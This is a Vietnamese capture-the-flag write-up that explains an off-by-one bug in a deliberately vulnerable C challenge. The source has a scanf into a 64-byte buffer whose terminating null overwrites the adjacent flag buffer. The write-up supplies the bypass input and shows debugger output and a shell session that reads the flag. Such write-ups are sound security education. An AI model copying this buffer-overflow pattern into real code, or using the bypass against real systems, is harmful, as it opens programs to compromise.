# Reverse file.

- Bài này tác giả cho source.

```python
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

void win() {
    system("/bin/sh");
}

void init() {
    alarm(60);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int main(void) {
    char your_try[64]={0};
    char flag[64]={0};

    init();

    puts("guess the flag!> ");

    FILE *fp = fopen("./flag", "r");
    if (fp == NULL) exit(-1);
    size_t length = fread(flag, 1, 64, fp);

    scanf("%64s", your_try);

    if (strncmp(your_try, flag, length) == 0) {
        puts("yes");
        win();
    } else {
        puts("no");
    }
    return 0;
}
```

- Mục tiêu của ta là nhập input sao cho if (strncmp(your_try, flag, length) == 0) sẽ có được flag.
- Ở đây ta thấy có bug off-by-one ở  scanf("%64s", your_try); vậy nếu ta nhập input ta 64bytes thì sẽ có 1 byte null được thêm vào cuối và nó sẽ overflow sang flag.
    - Ví dụ mình có flag: "a"*64 khi nhập input < 64 bytes thì không có gì xảy ra thì đoạn strncmp trên sẽ như sau:
        
        ```python
        ► 0x555555555431 <main+322>    call   strncmp@plt <strncmp@plt>
                s1: 0x7fffffffdf30 ◂— 'bbbbbbbb'
                s2: 0x7fffffffdf70 ◂— 0x6161616161616161 ('aaaaaaaa')
                n: 0x40
        ```
        
    - Nếu mình nhập input 64byte sẽ như sau:
        
        ```python
        ► 0x555555555431 <main+322>    call   strncmp@plt <strncmp@plt>
                s1: 0x7fffffffdf30 ◂— 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'
                s2: 0x7fffffffdf70 ◂— 0x6161616161616100
                n: 0x40
        ```
        
    - Byte null được thêm vào và tràn sang s2.
    - Vậy giờ ta chỉ cần nhập input là "\x00" cộng vs 63byte bất kì ta có thể pass được đoạn so sánh trên và vào được win.
    
    ```python
    ► 0x555555555431 <main+322>    call   strncmp@plt <strncmp@plt>
            s1: 0x7fffffffdf30 ◂— 0x6262626262626200
            s2: 0x7fffffffdf70 ◂— 0x6161616161616100
            n: 0x40
    ```
    
    ```python
    Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [*] Switching to interactive mode
    guess the flag!>
    yes
    $ cat flag
    TSGCTF{just_a_simple_off_by_one-chall_isnt_it}
    ```
